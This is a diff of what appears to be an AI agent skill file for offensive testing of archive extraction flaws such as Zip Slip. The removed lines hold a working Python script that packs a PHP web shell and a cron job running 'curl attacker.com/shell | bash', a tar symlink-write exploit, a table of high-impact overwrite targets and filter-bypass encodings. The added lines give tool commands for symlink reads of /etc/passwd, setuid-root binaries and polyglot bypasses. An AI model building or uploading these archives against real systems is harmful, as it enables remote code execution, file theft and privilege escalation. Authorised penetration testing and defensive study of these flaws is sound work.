@@ -1,113 +1,115 @@
 ---
 name: archive-path-traversal
-description: "Zip Slip and archive extraction path traversal vulnerabilities. Use when target has file upload with archive extraction, plugin installers, backup restoration, or any feature that unpacks ZIP/TAR/JAR/WAR/APK archives."
+description: Craft malicious archives (ZIP/TAR) to test extraction vulnerabilities including Zip Slip, symlink attacks, hardlink collisions, setuid escalation, polyglot bypasses, and Unicode path confusion. Use when a target accepts archive uploads or extracts archives server-side. Triggers on "archive upload", "zip slip", "tar extraction", "symlink", "hardlink", "polyglot", "archive alchemist", "extraction vulnerability".
 ---
 
-# Archive Path Traversal (Zip Slip)
+# Archive Path Traversal & Extraction Vulnerabilities
 
-When an application extracts archive entries using the entry name directly as the output path without canonicalization, an attacker-controlled entry name like `../../../etc/cron.d/pwn` writes outside the intended directory.
+Use this skill when the target accepts archive uploads (ZIP, TAR, tar.gz, tar.xz, tar.bz2) or otherwise extracts archives server-side. The web-security runtime includes **archivealchemist** at `~/git/archivealchemist/archive-alchemist.py` for crafting malicious archives.
 
-## Vulnerable Code Patterns
+## When to Use
 
-See [references/vulnerable-code.md](references/vulnerable-code.md) for patterns in Java, Python, Node.js, Go, Ruby, and .NET.
+Use archive extraction testing when you observe:
 
-The bug is always the same: `entry.getName()` flows into a file path constructor without validation that the resolved path stays inside the target directory.
+- Upload endpoints accepting `.zip`, `.tar`, `.tar.gz`, `.tar.xz`, `.tar.bz2`
+- Server-side archive extraction (file import, bulk upload, theme/plugin import)
+- Features that restore/back up data from archives
+- Any flow where archive entries become files on disk
 
-## Crafting Malicious Archives
+## Tool Reference
 
-```python
-import zipfile
+Tool path: `python3 ~/git/archivealchemist/archive-alchemist.py <archive> <command> [options]`
 
-with zipfile.ZipFile('evil.zip', 'w') as z:
-    z.writestr('../../var/www/html/shell.php', '<?php system($_GET["c"]); ?>')
-    z.writestr('../../etc/cron.d/pwn', '* * * * * root curl attacker.com/shell | bash\n')
-    z.writestr('readme.txt', 'Totally normal archive')
-```
+### Commands
 
-```bash
-# Using evilarc
-python evilarc.py shell.php -p "var/www/html" -d 3 -o unix
+| Command | Purpose |
+|---|---|
+| `add` | Add files, symlinks, hardlinks, directories |
+| `replace` | Replace entries or sync from a directory |
+| `append` | Append content to an existing entry |
+| `modify` | Change mode, uid, gid, mtime, convert to symlink/hardlink |
+| `remove` / `rm` | Remove entries |
+| `list` / `ls` | List archive contents |
+| `extract` | Extract safely by default; `--vulnerable` for unsafe extraction |
+| `read` / `cat` | Read a specific entry |
+| `polyglot` | Prepend magic bytes to an archive |
 
-# TAR archives
-tar cf evil.tar --transform='s,^,../../etc/cron.d/,' pwn
-```
+### Common Attack Patterns
 
-## Exploitation Targets
-
-| Target File | Impact | OS |
-|-------------|--------|-----|
-| `../../var/www/html/shell.php` | Web shell (RCE) | Linux |
-| `../../etc/cron.d/pwn` | Cron job (RCE) | Linux |
-| `../../root/.ssh/authorized_keys` | SSH access | Linux |
-| `../../WEB-INF/classes/Evil.class` | Java class injection | Java |
-| `../../inetpub/wwwroot/cmd.aspx` | Web shell (IIS) | Windows |
-| `.env` or `../../.env` | Environment variable override | Any |
-
-Chain with **write-path-to-rce** for framework view/template resolution that turns file write into RCE.
-
-## Bypassing Path Traversal Filters
-
-| Technique | Entry Name | Bypasses |
-|-----------|-----------|----------|
-| Backslash (Windows) | `..\..\wwwroot\shell.aspx` | Unix-only `../` check |
-| Encoded slash | `..%2f..%2fetc/passwd` | String-based filter on raw name |
-| Double-encoded | `..%252f..%252f` | Single decode + filter + second decode |
-| Absolute path | `/etc/cron.d/pwn` | Relative path check only |
-| Mixed separators | `..\/..\/etc/passwd` | Strict `../` match |
-
-**Test order:** basic `../` first, then backslash, then encoded variants, then absolute paths.
-
-## Symlink Attacks
-
-Even if `../` in filenames is filtered, symlinks bypass path validation because the entry name itself is clean.
-
-### Two-Step Symlink Write
-
-```python
-import tarfile, io
-
-with tarfile.open('evil.tar', 'w') as t:
-    # Step 1: symlink "uploads" -> /var/www/html (clean name)
-    sym = tarfile.TarInfo(name='uploads')
-    sym.type = tarfile.SYMTYPE
-    sym.linkname = '/var/www/html'
-    t.addfile(sym)
-
-    # Step 2: write through symlink (still no ../ in name)
-    shell = tarfile.TarInfo(name='uploads/shell.php')
-    shell.size = len(payload)
-    t.addfile(shell, io.BytesIO(payload.encode()))
-```
-
-Extraction order matters: symlink created first, then file write follows the symlink. Path validation sees `uploads/shell.php` as inside dest_dir.
-
-## Detection in Source Code
+#### Zip Slip (path traversal)
 
 ```bash
-# Java
-grep -rn "ZipEntry\|ZipInputStream\|JarEntry" --include="*.java"
-# Python
-grep -rn "zipfile\|tarfile\|extractall" --include="*.py"
-# Node.js
-grep -rn "adm-zip\|yauzl\|unzipper\|decompress" --include="*.js" --include="*.ts"
-# Go
-grep -rn "archive/zip\|archive/tar" --include="*.go"
-# .NET
-grep -rn "ZipArchive\|ZipFile" --include="*.cs"
-# Then verify: is there path validation after entry name extraction?
+python3 ~/git/archivealchemist/archive-alchemist.py zipslip.zip add "../../../tmp/evil.txt" --content "pwned"
 ```
 
-## Testing Checklist
+#### Symlink file read
 
-1. Identify all archive upload/extraction features
-2. Determine archive format accepted (ZIP, TAR, JAR, etc.)
-3. Craft malicious archive with `../` entry names
-4. Upload and check: does extraction create files outside dest dir?
-5. If blocked: try alternate traversal (backslash, encoded, symlink)
-6. If file write confirmed: identify highest-impact target file
-7. Chain with **write-path-to-rce** for code execution
+```bash
+python3 ~/git/archivealchemist/archive-alchemist.py symlink.tar -t tar add .bashrc --symlink "/etc/passwd"
+```
 
-## Related Skills
+#### Symlink collision (write through symlink)
 
-- **write-path-to-rce** -- Escalate file write to RCE via framework resolution
-- **custom-sanitizer-audit** -- If path sanitization exists but is bypassable
+```bash
+python3 ~/git/archivealchemist/archive-alchemist.py collision.tar -t tar add config.txt --symlink "/tmp/target.txt"
+python3 ~/git/archivealchemist/archive-alchemist.py collision.tar -t tar add config.txt --content "overwrite"
+```
+
+#### Setuid escalation
+
+```bash
+python3 ~/git/archivealchemist/archive-alchemist.py setuid.tar -t tar add exploit --content "#!/bin/sh\nwhoami" --mode 0755 --setuid --uid 0
+```
+
+#### Polyglot MIME bypass
+
+```bash
+python3 ~/git/archivealchemist/archive-alchemist.py polyglot.gif add payload.txt --content "hello there"
+python3 ~/git/archivealchemist/archive-alchemist.py polyglot.gif polyglot --content "GIF89a"
+```
+
+#### Unicode path confusion
+
+```bash
+python3 ~/git/archivealchemist/archive-alchemist.py weird.zip add file.txt --content "hello" --unicodepath notfile.txt
+```
+
+## Iterative Working Directory Workflow
+
+For complex archives, use a working directory and the `replace --content-directory` flow:
+
+```bash
+# 1. Extract the original archive safely
+python3 ~/git/archivealchemist/archive-alchemist.py target.zip extract -o workdir/
+
+# 2. Modify files in workdir/ or add malicious entries
+
+# 3. Sync working directory back into a new archive
+python3 ~/git/archivealchemist/archive-alchemist.py target_poc.zip replace --content-directory workdir/ ""
+
+# 4. Test target_poc.zip against the target
+
+# 5. Iterate
+```
+
+## Testing Procedure
+
+1. **Identify the extraction surface**: find upload/import/restore endpoints that accept archives.
+2. **Fingerprint the extractor**: upload a benign archive and observe where files land, what filenames are preserved, whether symlinks survive, and whether permissions are honored.
+3. **Start with Zip Slip**: most extractors fail to sanitize `../` sequences. Use a relative path traversal first.
+4. **Test symlink/hardlink support**: if the extractor follows symlinks, escalate to reading/writing arbitrary files.
+5. **Test polyglots**: if MIME type or magic-byte checks exist, prepend valid magic bytes to a ZIP archive.
+6. **Test Unicode path confusion**: some extractors use the Unicode Path extra field instead of the local file header name.
+7. **Check permission preservation**: if the extractor preserves permissions, setuid/setgid bits may lead to local privilege escalation.
+
+## Constraints
+
+- Do not test arbitrary write paths on production systems without scope confirmation.
+- Prefer writing to predictable, non-destructive locations (e.g., `/tmp/` subdirectories) during initial validation.
+- Some extractors strip symlinks, permissions, or traversal sequences; negative results for one pattern do not rule out others.
+- Archive extraction is usually a gadget chained with other vulnerabilities (e.g., LFI, SSRF, file upload) to achieve real impact.
+
+## Prerequisites
+
+- `~/git/archivealchemist/archive-alchemist.py` must exist (installed by the runtime).
+- Target must accept and extract archives.
